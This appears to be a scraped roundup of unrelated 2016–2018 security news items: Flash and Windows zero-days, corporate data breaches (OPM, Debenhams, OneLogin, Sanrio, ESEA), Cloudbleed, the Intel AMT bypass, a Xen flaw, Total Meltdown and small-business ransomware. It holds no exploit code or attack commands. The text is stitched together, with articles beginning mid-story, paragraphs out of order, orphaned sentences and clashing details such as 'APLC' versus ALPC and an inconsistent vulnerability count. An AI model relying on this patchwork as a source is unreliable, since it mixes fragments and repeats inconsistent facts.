Adobe has released a priority update to plug a critical security flaw in its popular Flash Player on Windows. As per an official announcement by the company, the latest patch will address issues in Adobe Flash Player 29.0.0.171 and other earlier versions. The vulnerabilities, according to Adobe, are being used by hackers to embed malicious content distributed via email.
Security firm Icebrg on Thursday announced that a zero-day vulnerability has led to exploitation in Adobe Flash specifically targeted towards users in the Middle East. The vulnerability (CVE-2018-5002) enables attackers to execute certain actions by executing code on the victims' computers. As per the blog post, the exploit uses a Microsoft Office document for the attack. To circumvent the fact that Adobe Flash is blocked on most browsers, the exploit involves loading Flash Player from within Microsoft Office. The flaw was reported by Icebrg in collaboration with Qihoo 360 Core Security.
""While this attack leveraged a zero-day exploit, individual attacker actions do not happen in isolation. There are several other behavioural aspects that can be used for detection. Any single observable might be low confidence but multiple observables clustered might be indicative of suspicious or malicious activity,"" said Icebrg staff in its blog post.
Of course, this is not the first instance wherein Flash Player's vulnerabilities have been exploited. Back in October last year, the company had issued a security patch to fix a critical leak.
Users have been strongly recommended to update Adobe Flash in order to avoid any such vulnerabilities seeping into your machines. The update, however, is not a guarantee towards protection against future discrepancies. It is thus advised to enable flash on only a secondary browser that is not used majorly on the computer.

Last month, Microsoft Patch Tuesday addressed 60 vulnerabilities that also included two zero-day flaws. This month also, the tech giant released a huge patch update to mitigate various flaws in its products. The Microsoft September patch fixed around 61 different vulnerabilities. The patch bundle also included a fix for the recently discovered APLC zero-day vulnerability that has already created trouble.

    “To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control over an affected system. The update addresses the vulnerability by correcting how Windows handles calls to ALPC.”
Besides the single APLC zero-day flaw, Microsoft also patched 61 other flaws in various products, including 17 critical vulnerabilities. The affected software receiving the bug fixes include Microsoft Windows, Microsoft Edge, ChakraCore, Microsoft Office and Web Apps, Microsoft.Data.OData, Internet Explorer, ASP.NET and the .NET Framework.
In addition, the Microsoft September patch also addressed a flaw in the Adobe Flash Player (CVE-2018-15967). Although Adobe also released a fix for this vulnerability along with other fixes released this week in the September Update pack.

The 21.5 million current and former federal employees impacted by the massive data breach in 2015 may never know if they will be targeted based on the information stolen from the Office of Personnel Management.
Bill Evanina, the director of the National Counterintelligence and Security Center and the National Counterintelligence Executive, said the rate of attacks and the amount of information out there from public and private sector breaches, means hackers likely will bring together a host of data to use in spear phishing attacks.
“If a foreign entity is using the data stolen from OPM, they will use it as one variable in a big matrix of targeting,” Evanina said on Ask the CIO.
“It’s really not going to be reality to say if Bill Evanina is targeted a year from now by a foreign government, I’m never going to be able to say it’s because of the OPM data breach.
It’s one set of data that is being used against those who would be targeted.
We really haven’t seen any anecdotal evidence about anything and at the end of the day I don’t think we will.
If it was stolen for the reason which we believe it was, you’ll never be able to point to the fact it was the OPM data breach”.
Evanina said federal employees should understand the difference between targeting.
If they are getting phone calls at home, that likely isn’t a foreign adversary targeting them.

A cyber attack has compromised the personal data of up to 26,000 Debenhams customers.
The breach, which is understood to have been malware-based, targeted the online portal for the retailer's florist arm, Debenhams Flowers.
Debenhams has stressed that the site is operated by Ecomnova, a third-party supplier, and that customers of other services have not been affected.
Ecomnova also operates Debenhams' websites for hampers, personalised gifts and wines. While all four sites have been suspended, the retailer has not announced whether the others were also breached.
Debenhams confirmed to Sky News that customer payment details, names and addresses were accessed or stolen during the attack.
In a statement the company stressed that it was only the Ecomnova-run site that had been compromised, and that customers of its main website Debenhams.com ""can be confident they are unaffected by this attack"".
""All affected customers have been contacted by Debenhams to inform them of the incident,"" the firm told Sky News.
""We are working with Ecomnova to ask the banks of those affected to block payment cards of those customers affected and issue customers with new cards.""
Debenhams said the incident had been reported to the Information Commissioner's Office (ICO), the UK's independent body for upholding the Data Protection Act.
Following a cyber attack in October 2015, the ICO fined TalkTalk a record £400,000 after 15,656 individuals' bank account details and sort codes were stolen.
An ICO spokesperson said it was aware of the ""potential incident"" involving Debenhams Flowers and that enquiries were being made.
""Businesses and organisations are required under the Data Protection Act to keep people's personal data safe and secure,"" the spokesperson said.
Debenhams chief executive Sergio Bucher said: ""As soon as we were informed that there had been a cyber attack, we suspended the Debenhams Flowers website and commenced a full investigation.
""We are very sorry that customers have been affected by this incident and we are doing everything we can to provide advice to affected customers and reduce their risk.""
Ecomnova did not immediately respond to Sky News for comment.

Experts have cast doubt on a recent report claiming that hackers linked to a Russian military intelligence agency used a piece of Android malware to track Ukrainian artillery units.
A report published by threat intelligence firm CrowdStrike before Christmas revealed that the Russia-linked cyberespionage group known as Fancy Bear (aka APT28, Pawn Storm, Sofacy, Tsar Team, Strontium and Sednit) modified a legitimate Android app used by the Ukrainian military.
Specifically, researchers found an Android version of X-Agent, a piece of malware known to be used by Fancy Bear, embedded in an app developed by artillery officer Yaroslav Sherstuk to help military personnel reduce the time to fire D-30 howitzers.
According to CrowdStrike, the malicious app, which had been distributed on Ukrainian military forums from late 2014 through 2016, was capable of accessing contact information, SMS messages, call logs and Internet data.
The security firm believes these capabilities could have allowed Russia to track Ukrainian troops via the app.
CrowdStrike also pointed to a report claiming that Ukraine had lost many D-30 guns in the past years, and speculated that this cyber operation may have contributed to those losses.
Based on its investigation, the company is confident that Fancy Bear is connected to the Russian military, particularly the GRU foreign military intelligence agency.
Sherstuk has called CrowdStrike’s report “delusional” and pointed out that the app is not open source.
He says the application has been under his control and he personally oversees the activation of each installation.
Jeffrey Carr, CEO of Taia Global and founder of the Suits and Spooks conference, has analyzed CrowdStrike’s report and, after contacting several other experts, he determined that the security firm’s arguments are flawed.
According to Carr, while X-Agent may be used by Fancy Bear, the malware is not exclusive to the group.
The X-Agent source code appears to have been obtained by several entities, including Ukrainian hacktivist Sean Townsend and the security firm ESET.
The X-Agent variant found in the Ukraine military app has also been analyzed by Crysys, the Hungary-based security firm that has investigated several sophisticated pieces of malware, including Duqu.
Researchers have found similarities between X-Agent implants described in previous Fancy Bear reports and the version found in the Ukrainian military app, but they pointed out that such similarities can be faked by threat actors.
Another interesting discovery is that the rogue app does not use GPS to obtain the infected device’s exact location, which Carr names “a surprising design flaw for custom-made malware whose alleged objective was to collect and transmit location data on Ukrainian artillery to the GRU”.
While the malware can collect some location data via the base stations used by the infected Android device, Carr believes it’s not enough to track someone, especially given Ukraine’s poor cellular service.
Pavlo Narozhnyy, a technical adviser to Ukraine’s military, told VOA that he doubts the D-30 app can be hacked, and he claimed that none of the app’s users reported any D-30 howitzer losses.
Carr also highlighted that the malware-infected app may have not actually made it onto a single Ukrainian soldier’s Android device, considering that each user needed to contact Sherstuk personally to obtain an activation code.

Microsoft Internet Information Services (IIS) 6.0 is vulnerable to a zero-day Buffer Overflow vulnerability (CVE-2017-7269) due to an improper validation of an ‘IF’ header in a PROPFIND request.
A remote attacker could exploit this vulnerability in the IIS WebDAV Component with a crafted request using PROPFIND  method.
Successful exploitation could result in denial of service condition or  arbitrary code execution in the context of the user running the application.
According to the researchers who found this flaw, this vulnerability was exploited in the wild in July or August 2016.
Other threat actors are now in the stages of creating malicious code based on the original proof-of-concept (PoC) code.
Web Distributed Authoring and Versioning (WebDAV) is an extension of the HTTP protocol that allows clients to perform remote Web content authoring operations.
WebDAV extends the set of standard HTTP methods and headers allowed for the HTTP request.
Few example of WebDAV methods are COPY, LOCK, MKCOL, PROPFIND, UNLOCK etc.
This vulnerability is exploited using the PROPFIND method and IF header.
The PROPFIND method retrieves properties defined on the resource identified by the Request-URI.
All the WebDAV-Compliant resources must support the PROPFIND method.
The IF header handles the state token as well as the ETags.
It makes the request conditional by supplying a series of state lists with conditions that match tokens and ETags to specific resource.
If all states present in the IF header fail, the request fails with 412 (Precondition Failed) status.

Bad as Cloudbleed is, there’s no evidence attackers exploited it before the patch was deployed.
But since the vulnerability was triggered more than 1.2m times from 6,500 sites, Cloudflare is taking no chances: the company has tapped an outside company, Veracode, to scour its code.
CEO Matthew Prince pledged the external review as he set out a detailed update after 12 days of investigation.
That update includes a synopsis of how the vulnerability was created and who faced the most risk.
He said Cloudflare continues to work with Google and others to eliminate all leaked data from memory:
We’ve successfully removed more than 80,000 unique cached pages.
That underestimates the total number because we’ve requested search engines purge and re-crawl entire sites in some instances.
Cloudbleed is a serious vulnerability in Cloudflare’s internet infrastructure that Google Project Zero researcher Tavis Ormandy discovered in mid-February.
It turned out that a single character in Cloudflare’s code caused the problem.
In its initial blog post on the matter, Cloudflare said the issue stemmed from its decision to use a new HTML parser called cf-html.
In his update, Prince said Cloudbleed was triggered when a page with two characteristics was requested through Cloudflare’s network.

Yesterday, on Microsoft’s Patch Tuesday the company released its monthly security patches that fixed 62 security flaws. These fixes also included a fix for a zero-day vulnerability that was under active exploitation before these patches were made available. Microsoft also announced the re-release of its Windows 10 version 1809 and Windows Server 2019.
Microsoft credited Kaspersky Lab researchers for discovering this zero-day, which is also known as CVE-2018-8589 and impacts the Windows Win32k component. A Kaspersky spokesperson told ZDNet, “they discovered the zero-day being exploited by multiple cyber-espionage groups (APTs).” The zero-day had been used to elevate privileges on 32-bit Windows 7 versions.
This is the second Windows elevation of privilege zero-day patched by Microsoft discovered by Kaspersky researchers. Last month, Microsoft patched CVE-2018-8453, another zero-day that had been used by a state-backed cyber-espionage group known as FruityArmor.
However, in this month’s Patch Tuesday, Microsoft has not patched a zero-day that is affecting the Windows Data Sharing Service (dssvc.dll). This zero-day was disclosed on Twitter at the end of October.
According to ZDNet, “Microsoft has published this month a security advisory to instruct users on how to properly configure BitLocker when used together with solid-state drives (SSDs).”
As reported by Microsoft, the Windows 10 October 2018 update caused user’s data loss post updating. Due to this, the company decided to pause the update. However, yesterday, Microsoft announced that it is re-releasing Windows 10 version 1809.
John Cable, the director of Program Management for Windows Servicing and Delivery at Microsoft said, “the data-destroying bug that triggered that unprecedented decision, as well as other quality issues that emerged during the unscheduled hiatus, have been thoroughly investigated and resolved.”
Microsoft also announced the re-release of Windows Server 2019, which was affected by the same issue. According to ZDNet, “The first step in the re-release is to restore the installation files to its Windows 10 Download page so that “seekers” (the Microsoft term for advanced users who go out of their way to install a new Windows version) can use the ISO files to upgrade PCs running older Windows 10 versions.”
Michael Fortin, Windows Corporate Vice President, in a blog post, offered some context behind the recent issues and announced changes to the way the company approaches communications and also the transparency around their process. Per Fortin, “We obsess over these metrics as we strive to improve product quality, comparing current quality levels across a variety of metrics to historical trends and digging into any anomaly.”

The city of North Bend, Ore., was hit with a ransomware attack which temporarily locked out city workers from their computers and databases.
“One weekend morning a few weeks back all of our servers and things locked up, and we received a ransomware note that asked for $50,000 in Bitcoin these people would provide us with the code to unlock our computer systems,” North Bend City Administrator Terence O’Connor told The World.
Fortunately the city’s IT systems were backed up and officials were able to avoid the high ransom demanded by the criminals responsible for the attack.
City officials did, however, call in the FBI to investigate the attack and while they were unable to identify anyone directly involved in the attack, they were able to trace the ransom demand to Romania.
O’Connor added that the attack appeared to be a more sophisticated ransomware where there are two keys needed to unlock your system with one planted in the system and the other is held by the culprit.
The city was insured and ended up having to pay around $5,000 in out of pocket expenses as well as added a firewall security to prevent future attacks.

OneLogin has revealed more about the attack on its systems, confirming that a ""threat actor"" had accessed database tables including ""information about users, apps, and various types of keys.""
It warned once again that the malefactor, who was able to rifle through OneLogin's infrastructure for seven hours, may have been able to decrypt customer data. The company said:
Our review has shown that a threat actor obtained access to a set of AWS keys and used them to access the AWS API from an intermediate host with another, smaller service provider in the US. Evidence shows the attack started on May 31, 2017 around 2 am PST. Through the AWS API, the actor created several instances in our infrastructure to do reconnaissance.
OneLogin staff was alerted of unusual database activity around 9 am PST and within minutes shut down the affected instance as well as the AWS keys that were used to create it.
One customer affected by the OneLogin attack told Ars that he was having to ""rebuild the whole authentication security system... OUCH!""
OneLogin told fretful customers in an internal notification that they would need to work through a number of steps to secure their accounts, including generation of new API credentials and OAuth tokens. Any users served by the firm's US data centre have been hit by the breach, OneLogin said.
""While we encrypt certain sensitive data at rest, at this time we cannot rule out the possibility that the threat actor also obtained the ability to decrypt data,"" OneLogin said. ""We are thus erring on the side of caution and recommending actions our customers should take, which we have already communicated to our customers.""
OneLogin has admitted that the single sign-on (SSO) and identity management firm has suffered a data breach. However its public statement is vague about the nature of the attack.
An e-mail to customers provides a bit of detail—warning them that their data may have been exposed. And a support page that is only accessible to OneLogin account holders is even more worrying for customers. It apparently says that ""customer data was compromised, including the ability to decrypt encrypted data.""
OneLogin—which claims to offer a service that ""secures connections across all users, all devices, and every application""—said on Thursday that it had ""detected unauthorised access"" in the company's US data region. It added in the post penned by OneLogin CISO Alvaro Hoyos:
We have since blocked this unauthorised access, reported the matter to law enforcement, and are working with an independent security firm to determine how the unauthorised access happened and verify the extent of the impact of this incident. We want our customers to know that the trust they have placed in us is paramount.
While our investigation is still ongoing, we have already reached out to impacted customers with specific recommended remediation steps and are actively working to determine how best to prevent such an incident from occurring in the future and will update our customers as these improvements are implemented.
It has given customers a long list of actions to protect their accounts following the attack.
It's unclear why it is that OneLogin has provided three different sets of information to its customers. It's possible the company was hoping to only disclose more detail to those directly affected by the attack to avoid revealing potential weaknesses that may have exposed the data in the first place. But that attempt to keep the information under wraps has clearly backfired as customers scramble to secure their accounts.
This is the second data breach that OneLogin has suffered within the past year. Last August it warned customers of a cleartext login bug on its Secure Notes service, after ""an unauthorised user gained access to one of our standalone systems, which we use for log storage and analytics."" Hoyos apologised for that particular breach. ""We are making every effort to prevent any similar occurrence in the future,"" he said at the time.

IOActive exposed numerous vulnerabilities found in multiple home, business, and industrial robots available on the market today.
The array of vulnerabilities identified in the systems evaluated included many graded as high or critical risk, leaving the robots highly susceptible to attack.
Attackers could employ the issues found to maliciously spy via the robot’s microphone and camera, leak personal or business data, and in extreme cases, cause serious physical harm or damage to people and property in the vicinity of a hacked robot.
“There’s no doubt that robots and the application of Artificial Intelligence have become the new norm and the way of the future,” said Cesar Cerrudo, CTO at IOActive.
“Robots will soon be everywhere – from toys to personal assistants to manufacturing workers – the list is endless.
Given this proliferation, focusing on cybersecurity is vital in ensuring these robots are safe and don’t present serious cyber or physical threats to the people and organisations they’re intended to serve”.
During the past six months, IOActive’s researchers tested mobile applications, robot operating systems, firmware images, and other software in order to identify the flaws in several robots from vendors, including:
“In this research, we focused on home, business, and industrial robots, in addition to robot control software used by several robot vendors,” said Lucas Apa, Senior Security Consultant at IOActive.
“Given the huge attack surface, we found nearly 50 cybersecurity vulnerabilities in our initial research alone, ranging from insecure communications and authentication issues, to weak cryptography, memory corruption, and privacy problems, just to name a few”.
According to Cerrudo and Apa, once a vulnerability has been exploited, a hacker could potentially gain control of the robot for cyber espionage, turn a robot into an insider threat, use a robot to expose private information, or cause a robot to perform unwanted actions when interacting with people, business operations, or other robots.
In the most extreme cases, robots could be used to cause serious physical damage and harm to people and property.
As robots become smarter, threats will also increase.
Hacked robots could start fires in a kitchen by tampering with electricity, or potentially poison family members and pets by mixing toxic substances in with food or drinks.
Family members and pets could be in further peril if a hacked robot was able to grab and manipulate sharp objects.
“We have already begun to see incidents involving malfunctioning robots doing serious damage to their surroundings, from simple property damage to loss of human life, and the situation will only worsen as the industry evolves and robot adoption continues to grow,” continued Cerrudo.

A remote hijacking flaw that lurked in Intel chips for seven years was more severe than many people imagined, because it allowed hackers to remotely gain administrative control over huge fleets of computers without entering a password. This is according to technical analyses published Friday.
Further ReadingIntel patches remote hijacking vulnerability that lurked in chips for 7 years. As Ars reported Monday, the authentication bypass vulnerability resides in a feature known as Active Management Technology. AMT, as it's usually called, allows system administrators to perform a variety of powerful tasks over a remote connection. Among the capabilities: changing the code that boots up computers, accessing the computer's mouse, keyboard, and monitor, loading and executing programs, and remotely powering on computers that are turned off. In short, AMT makes it possible to log into a computer and exercise the same control enjoyed by administrators with physical access.
AMT, which is available with many vPro processors, was set up to require a password before it could be remotely accessed over a Web browser interface. But, remarkably, that authentication mechanism can be bypassed by entering no text at all. According to a blog post published Friday by Tenable Network Security, the cryptographic hash that the interface's digest access authentication requires to verify someone is authorized to log in can be anything at all, including no string at all.
""Authentication still worked"" even when the wrong hash was entered, Tenable Director of Reverse Engineering Carlos Perez wrote. ""We had discovered a complete bypass of the authentication scheme.""
A separate technical analysis from Embedi, the security firm Intel credited with first disclosing the vulnerability, arrived at the same conclusion. 
Embedi e-mailed the analysis to reporters, but didn't publish it online.
Making matters worse, unauthorized accesses typically aren't logged by the PC because AMT has direct access to the computer's network hardware. When AMT is enabled, all network packets are redirected to the Intel Management Engine and from there to the AMT. The packets bypass the OS completely. The vulnerable management features were made available in some but not all Intel chipsets starting in 2010, Embedi has said.
In a blog post published Friday, Intel officials said they expect PC makers to release a patch next week. The releases will update Intel firmware, meaning patching will require that each vulnerable chip set is reflashed. In the meantime, Intel is urging customers to download and run this discovery tool to diagnose potentially vulnerable computers. Systems that test positive should be temporarily secured using this mitigation guide until a patch is supplied. Computer makers Fujitsu, HP, and Lenovo, have also issued advisories for specific models they sell.

In a statement, Sanrio said they didn’t believe any data was stolen.
Now, over a year later, the database has surfaced online.
Its resurrection places 3.3 million Hello Kitty fans in the hot seat.
On December 19, 2015, Salted Hash broke the news that a MongoDB installation for Sanrio, the company behind Hello Kitty, was exposed to the public.
The database was discovered by security researcher Chris Vickery.
Learn about top security certifications: Who they're for, what they cost, and which you need.
At the time, Sanrio speculated the exposure was due to maintenance conducted several weeks prior, on November 20, 2015.
The database contained just over 3.3 million records from sanriotown.com, including 186,261 records assigned to people under the age of 18.
Three days after the story broke, on December 22, 2015, Sanrio said they investigated the problem and fixed it.
“In addition, new security measures have been applied on the server(s); and we are conducting an internal investigation and security review into this incident.
To the Company’s current knowledge, no data was stolen or exposed,” the statement concluded.
Unfortunately, someone did copy the database before the configuration error was fixed.
On Sunday, Salted Hash learned that the Sanrio database was added to the LeakedSource index.
Examining the LeakedSource records and comparing the field names to the screenshots shared by Vickery in 2015, the data is a match.
For example, both sets of data use the “_createdFrom” field, as well as “dateOfBirth”, “gender”, “firstName”, “lastName”, etc.
In both databases, the records contain the account holder’s first and last name, birthday (encoded, but easily reversed), gender, country of origin, email addresses, user name, password (unsalted SHA-1 hash), password hint question, and the corresponding answer.
However, there is a field in the LeakedSource records that is new to this story, “incomeRange” with values running from 0 to 150.
It isn’t clear what these values represent, but not every record has them.
As was the case previously, the fear is that the exposed database could cause problems for those registered, especially the children.
It’s hard enough to deal with ID theft related issues as an adult.
Such issues are only compounded for children, as the problems might not materialize for several years.
This is true today as well, but there’s no telling who followed the advice.
Also, there is no way to track who had access to this database, as it’s been circulating out of the public eye for a least a year before it was shared with LeakedSource.
Salted Hash has reached out to Sanrio for comment.
Anyone with concerns about the information exposed can checkout Consumer.gov for advice on recovering from identity theft.
In it, they briefly recap the events from 2015, including their previous alert.
The statement goes on to dismiss the latest news, despite sample records matching the previously exposed database.
""Recently, reports have surfaced claiming that the 2015 data breach was not corrected.
At this time, there is no evidence to support this claim.
The original data breach from SanrioTown.com users in 2015 did not include credit card information or other payment information.
Users’ passwords are encrypted with the cryptographic hash function SHA-1.
""SanrioTown and Sanrio Digital notified users about the incident, advising them to change their passwords.
It should be noted that this current Sanrio database currently circulating online doesn't have any financial data, and there have been no claims otherwise.
Salted Hash has asked additional questions surrounding the sample data shared with Sanrio.
After reviewing the sample data sets shared by Salted Hash, Sanrio has confirmed that the data indexed by LeakedSource ""looks real"" and likely originated from the exposed database in 2015.
However, the company stopped short of confirming that LeakedSource's records and the records exposed two years ago are one in the same.
“Sanrio Digital recently received evidence that a 2015 data breach of the SanrioTown web site involved some user data theft,” the company said in a statement.
“At the time, we had no evidence of data theft, however we have now learned from reporter Steve Ragan of CSO Online that personal information of SanrioTown.com users was stolen during the 2015 data breach.
According to Mr. Ragan, a database containing information of 3,345,168 SanrioTown users has been circulating since the time of the incident.
“He received the sample records from LeakedSource containing information of 30 SanrioTown users.
We have verified that these sample records appear to be real.
We cannot, however, relate the source of such sample records to the 2015 data breach and we are unable to verify whether the database of LeakedSource contains information of 3,345,168 SanrioTown users stolen during the 2015 SanrioTown data breach”.

E-Sports Entertainment Association (ESEA), one of the largest competitive video gaming communities on the planet, was hacked last December.
As a result, a database containing 1.5 million player profiles was compromised.
On Sunday, ESEA posted a message to Twitter, reminding players of the warning issued on December 30, 2016, three days after they were informed of the hack.
Sunday’s message said the leak of player information was expected, but they’ve not confirmed if the leaked records came from their systems.
Late Saturday evening, breach notification service LeakedSource announced the addition of 1,503,707 ESEA records to their database.
When asked for additional information by Salted Hash, a LeakedSource spokesperson shared the database schema, as well as sample records pulled at random from the database.
Learn about top security certifications: Who they're for, what they cost, and which you need.
However, in all, there are more than 90 fields associated with a given player record in the ESEA database.
While the passwords are safe, the other data points in the leaked records could be used to construct a number of socially-based attacks, including Phishing.
Players on Reddit have confirmed their information was discovered in the leaked data.
A similar confirmation was made Twitch’s Jimmy Whisenhunt on Twitter.
The LeakedSource spokesperson said that the ESEA hack was part of a ransom scheme, as the hacker responsible demanded $50,000 in payment.
In exchange for meeting their demands, the hacker would keep silent about the ESEA hack and help the organization address the security flaw that made it possible.
In their previous notification, ESEA said they learned about the incident on December 27, but make no mention of any related extortion attempts.
The organization reset passwords, multi-factor authentication tokens, and security questions as part of their recovery efforts.
We’ve reached out to confirm the extortion attempt claims made by the hacker, as well as the total count for players affected by the data breach.
In an emailed statement, a spokesperson for ESL Gaming (parent company to Turtle Entertainment) confirmed that the hacker did in fact attempt to extort money, but the sum demanded was ""substantially higher"" than the $50,000 previously mentioned.
The company refused to give into the extortion demands, and went public with details before the hacker could publish anything.
The statement also confirms the affected user count of 1.5 million, and stressed the point that ESEA passwords were hashed with bcrypt.
When it comes to the profile fields, where more than 90 data points are listed, ESL Gaming says those are optional data points for profile settings.
""We take the security and integrity of customer details very seriously and we are doing everything in our power to investigate this incident, establish precisely what has been taken, and make changes to our systems to mitigate any further breaches.
The authorities (FBI) were also informed and we will do everything possible to facilitate the investigation of this attack,"" the message from ESL Gaming concluded.
""Based on the proof provided to us by the threat actor of possession of the stolen data, we were able to identify the scope of the data that was accessed.
While the primary concern and focus was on personal data, some of ESEA’s internal infrastructure including configuration settings of game server hardware specifications, as well as game server IPs was also accessible.
Due to the ongoing investigation, we prioritized customer user data first,"" the statement explains.
In the days that followed that initial contact, ESEA worked to secure their systems, and the hacker kept making demands.

Microsoft’s security team had a busy weekend.
On Friday night, security researcher Tavis Ormandy of Google’s Project Zero announced on Twitter that he had found a Windows bug. Well, not just any bug. It was “crazy bad,” Ormandy wrote. “The worst Windows remote code exec in recent memory.” By Monday night, Microsoft had released an emergency patch, along with details of what the vulnerability entailed. And yes, it was every bit as scary as advertised.
That’s not only because of the extent of the damage hackers could have done, or the range of devices the bug affected. It’s because the bug's fundamental nature underscores the vulnerabilities inherent in the very features meant to keep our devices safe.
What made this particular bug so insidious was that it would have allowed hackers to target Windows Defender, an antivirus system that Microsoft builds directly into its operating system. That means two things: First, that it impacted the billion-plus devices that have Windows Defender installed. (Specifically, it took advantage of the Microsoft Malware Protection Engine that underpins several of the company’s software security products.) Second, that it leveraged that program’s expansive permissions to enable general havoc, without physical access to the device or the user taking any action at all.
“This was, in fact, crazy bad,” says Core Security systems engineer Bobby Kuzma, echoing Ormandy’s original assessment.

As Google engineers note in a report on the bug, to pull off the attack a hacker would have only had to send a specialized email or trick a user into visiting a malicious website, or otherwise sneak an illicit file onto a device. This also isn’t just a case of clicking the wrong link; because Microsoft’s antivirus protection automatically inspects every incoming file, including unopened email attachments, all it takes to fall victim is an inbox.
“The moment [the file] hits the system, the Microsoft malware protection intercepts it and scans it to make sure it’s ‘safe,’” says Kuzma. That scan triggers the exploit, which in turn enables remote code execution that enables a total machine takeover. “As soon as it’s there, the malware protection will take it up and give it root access.”
It’s scary stuff, though tempered by Microsoft’s quick action and the fact that Ormandy appears to have found the bug before bad actors did. And because Microsoft issues automatic updates for its malware protection, most users should be fully protected soon, if not already. It should still serve as an object lesson, though, in the risks that come with antivirus software that has tendrils in every part of your system.
It’s a scary world out there, and antivirus generally helps make it less so. To do its job correctly, though, it needs unprecedented access to your computer—meaning that if it falters, it can take your entire system down with it.
“There is a raging debate about antivirus in some circles, stating that it can be used as a springboard to infect users,” says Jérôme Segura, lead malware intelligence analyst with Malwarebytes. “The fact of the matter is that security software is not immune to flaws, just like any other program, but there is no denying the irony when an antivirus could be leveraged to infect users instead of protecting them.”
Irony and, well, damage. A year ago, Google’s Ormandy found critical vulnerabilities that affected no fewer than 17 Symantec antivirus products. He’s found similar in offerings from security vendors like FireEye, McAfee, and more. And more recently, researchers discovered an attack called “DoubleAgent,” which turned Microsoft’s Application Verifier tool into a malware entry point.
“Because of what they do, AV products are really complex and have to touch a lot of things that are untrusted,” says Kuzma. “This is the kind of vulnerability we’ve seen time and again.”
There’s also no real solution; it’s not easy to weigh the protections versus the risks. The best you can hope for, really, is what Ormandy and Microsoft demonstrated during the last few days: That someone catches the mistakes before the bad guys do, and that the fixes come fast and easy.

This is a serious violation of the security barrier enforced by the hypervisor and poses a particular threat to multi-tenant data centers where the customers' virtualized servers share the same underlying hardware.
The open-source Xen hypervisor is used by cloud computing providers and virtual private server hosting companies, as well as by security-oriented operating systems like Qubes OS.
The new vulnerability affects Xen 4.8.x, 4.7.x, 4.6.x, 4.5.x, and 4.4.x and has existed in the Xen code base for over four years.
It was unintentionally introduced in December 2012 as part of a fix for a different issue.
The Xen project released a patch Tuesday that can be applied manually to vulnerable deployments.
The good news is that the vulnerability can only be exploited from 64-bit paravirtualized guest operating systems.
Xen supports two types of virtual machines: Hardware Virtual Machines (HVMs), which use hardware-assisted virtualization, and paravirtualized (PV) VMs that use software-based virtualization.
Based on whether they use PV VMs, Xen users might be affected or not.
For example, Amazon Web Services said in an advisory that its customers' data and instances were not affected by this vulnerability and no customer action is required.
Meanwhile, virtual private server provider Linode had to reboot some of its legacy Xen servers in order to apply the fix.
Qubes OS, an operating system that uses Xen to isolate applications inside virtual machines, also put out an advisory warning that an attacker who exploits another vulnerability, for example inside a browser, can exploit this Xen issue to compromise the whole Qubes system.
The Qubes developers have released a patched Xen package for Qubes 3.1 & 3.2 and reiterated their intention to stop using paravirtualization altogether in the upcoming Qubes 4.0.
Vulnerabilities that allow breaking the isolation layer of virtual machines can be very valuable for attackers.

Microsoft today issued an emergency security update to correct a security update it issued earlier this month to correct a security update it issued in January and February.
In January and February, Redmond emitted fixes for Windows 7 and Server 2008 R2 machines to counter the Meltdown chip-level vulnerability in modern Intel x64 processors. Unfortunately, those patches blew a gaping hole in the operating systems: normal applications and logged-in users could now access and modify any part of physical RAM, and gain complete control over a box, with the updates installed.
Rather than stop programs and non-administrators from exploiting Meltdown to extract passwords and other secrets from protected kernel memory, the fixes on Windows 7 and Server 2008 R2 instead granted full read-write privileges to system RAM.
Roll on March, and Microsoft pushed out fixes on Patch Tuesday to correct those January and February updates to close the security vulnerability it accidentally opened.
Except that March update didn't fully seal the deal: the bug remained in the kernel, and was exploitable by malicious software and users.

 Total Meltdown
Now, if you're using Windows 7 or Server 2008 R2 and have applied Microsoft's Meltdown patches, you'll want to grab and install today's out-of-band update for CVE-2018-1038.
Swedish researcher Ulf Frisk discovered the January and February Meltdown mitigations for Win7 and Server 2008 R2 were broken, and went public with his findings once the March Patch Tuesday had kicked off. As it turns out, this month's updates did not fully fix things, and Microsoft has had to scramble to remedy what was now a zero-day vulnerability in Windows 7 and Server 2008.
In other words, Microsoft has just had to put out a patch for a patch for a patch. Hardly inspiring stuff, but we suppose the old Microsoft adage remains true – never trust a Redmond product until version three at the earliest. On the other hand, writing kernel-level memory management code is an absolute bastard at times, so you have to afford the devs some sympathy.

A Warwick company’s managing director is warning other businesses to protect themselves from cyber criminals after being held to ransom.
Kettell Video Productions was targeted by tech scammers who infected its IT systems with viruses before demanding £1,000 in online currency Bitcoins or the files would be permanently deleted.
Luckily, owner Stuart Kettell routinely backs up all his company’s systems so nothing was lost but he warned others to do the same to avoid disaster.
“It was scary: I had no idea about cyber-attacks before and really didn’t know what to do,” he said. 
“Critical files, including images and videos for clients, were wiped out along with a lifetime of personal memories.
“The affected files were lost for good – the only way to recover them was with the key code held by the blackmailer – but luckily I back-up everything to an external data cartridge. 
“In the end it was more an inconvenience…but it could have threatened the business.
“I would strongly urge all business owners to back-up their essential files.”
Mr Kettell acted quickly when he realised the audio-visual specialists in Arlescote Close were under attack by the web sharks in December, 2015.
“I noticed all my photos, videos and pdf files ghosting to white with a new filename… it attacked my desktop first then it wormed its way into folders one file at a time every few seconds,” he said.
“I’ve no idea how the malware was introduced as we use software that’s designed to prevent against such attacks. 
“And the demand for payment seemed very professional: I was given links where I could buy Bitcoins and even offered the chance to decrypt one file for free.
“I unplugged my computer, isolated it from the internet, and ran some anti-malware software to stop the virus spreading further.”
Latest figures from the Crime Survey for England & Wales estimated there were 1.3m computer virus offences and 667,000 hacking related offences committed in the year ending September 2016.
Sergeant Gary Sirrell from the cybercrime team at West Midlands Regional Organised Crime Unit said commercial web attacks are increasingly being committed against smaller firms and not big multi-nationals.
“Small and medium sized companies are easier targets: they often don’t have the resources or expertise to protect against cyberattacks,” he said. 
“And if they are targeted, the impact can be devastating. 
“But there are steps business owners can take to mitigate the risk. 
“A really effective tactic involves ‘layering’ defences to include a firewall, anti-malware software, staff training and regular re-training) around phishing email awareness, and finally to plug any holes in your defences by updating software patches and updates in a timely manner.
“By exercising good cyber hygiene, and having a strong backup policy, Stuart avoided the dilemma of whether to see his business significantly damaged, or to have to hand over a ransom to organised crime gangs to get his data unlocked. 
“If more businesses in the West Midlands proactively took such steps there would be significantly fewer crimes victims.”

Git has disclosed a security vulnerability that allows for arbitrary code execution in malicious repositories, Microsoft reports.
